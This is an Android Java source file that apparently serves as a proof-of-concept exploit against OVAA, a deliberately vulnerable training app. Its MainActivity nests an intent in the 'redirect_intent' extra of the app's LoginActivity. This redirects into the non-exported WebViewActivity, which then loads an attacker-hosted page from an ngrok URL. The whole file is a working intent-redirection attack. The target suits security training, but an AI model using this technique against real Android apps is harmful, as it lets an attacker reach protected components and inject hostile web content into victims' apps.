package com.example.embeddedintent;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent second = new Intent();
        second.setClassName("oversecured.ovaa","oversecured.ovaa.activities.WebViewActivity");
        second.putExtra("url","https://b92edc13ce8e.ngrok.io/poc.html");

        Intent intent = new Intent();
        intent.setClassName("oversecured.ovaa","oversecured.ovaa.activities.LoginActivity");
        intent.putExtra("redirect_intent",second);
        startActivity(intent);

    }
}